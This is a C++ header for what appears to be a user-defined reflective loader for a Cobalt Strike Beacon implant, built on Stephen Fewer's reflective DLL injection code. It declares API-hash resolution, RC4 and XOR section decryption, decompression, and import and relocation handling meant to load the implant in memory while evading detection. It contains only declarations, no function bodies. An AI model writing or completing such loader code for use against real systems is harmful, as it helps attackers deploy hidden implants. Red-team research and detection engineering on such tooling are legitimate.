#pragma once
//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include "LoaderTypes.h"
#include "Hash.h"
#include "Obfuscation.h"
#include "BeaconUserData.h"

#define VIRTUAL_SIZE_OF_PE_HEADER 0x1000

// Calculate hashes of required Windows APIs and define their types
constexpr DWORD VIRTUALFREE_HASH = CompileTimeHash("VirtualFree");
constexpr DWORD RTLDECOMPRESSBUFFER_HASH = CompileTimeHash("RtlDecompressBuffer");

typedef BOOL(WINAPI* VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
typedef DWORD(NTAPI* RTLDECOMPRESSBUFFER)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);

typedef unsigned __int64 QWORD;

typedef struct _OBFUSCASTION_LOADER_APIS {
    WINDOWSAPIS Base;
    VIRTUALFREE VirtualFree;
    RTLDECOMPRESSBUFFER RtlDecompressBuffer;
} OBFUSCASTION_LOADER_APIS, * POBFUSCATION_LOADER_APIS;

#pragma pack(push, 1)
typedef struct _SECTION_INFORMATION {
    DWORD VirtualAddress;
    DWORD PointerToRawData;
    DWORD SizeOfRawData;
} SECTION_INFORMATION, *PSECTION_INFORMATION;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _PE_HEADER_DATA {
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD entryPoint;
    QWORD ImageBase;
    SECTION_INFORMATION Text;
    SECTION_INFORMATION Rdata;
    SECTION_INFORMATION Data;
    SECTION_INFORMATION Pdata;
    SECTION_INFORMATION Reloc;
    DWORD ExportDirectoryRVA;
    DWORD DataDirectoryRVA;
    DWORD RelocDirectoryRVA;
    DWORD RelocDirectorySize;
    DWORD TextSectionXORKeyLength;
    DWORD RdataSectionXORKeyLength;
    DWORD DataSectionXORKeyLength;
} PE_HEADER_DATA, *PPE_HEADER_DATA;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _UDRL_HEADER_DATA {
    DWORD Base64Size;
    DWORD CompressedSize;
    DWORD RawFileSize;
    DWORD LoadedImageSize;
    DWORD Rc4KeyLength;
} UDRL_HEADER_DATA, *PUDRL_HEADER_DATA;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _KEY_INFO {
    size_t keyLength;
    char* key;
} KEY_INFO, * PKEY_INFO;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _XOR_KEYS {
    KEY_INFO TextSection;
    KEY_INFO RdataSection;
    KEY_INFO DataSection;
} XOR_KEYS, * PXOR_KEYS;
#pragma pack(pop)

BOOL ObfuscationLoaderResolveFunctions(_PPEB pebAddress, POBFUSCATION_LOADER_APIS winApi);
void ObfuscationLoaderCopySections(PALLOCATED_MEMORY_REGION allocatedMemoryBlock, PPE_HEADER_DATA peHeaderData, PXOR_KEYS xorKeys, char* srcImage, char* dstAddress, DWORD modifiedImageSize, DWORD memoryProtections, ALLOCATED_MEMORY_MASK_MEMORY_BOOL mask);
void ObfuscationLoaderCopySection(char* dstAddress, char* srcImage, PSECTION_INFORMATION section);
void ObfuscationLoaderXORSection(char* dstAddress, PSECTION_INFORMATION section, PKEY_INFO keyInfo);
void ObfuscationLoaderResolveImports(PPE_HEADER_DATA peHeaderData, char* dstAddress, PWINDOWSAPIS winApi);
void ObfuscationLoaderProcessRelocations(PPE_HEADER_DATA peHeaderData, char* dstAddress);
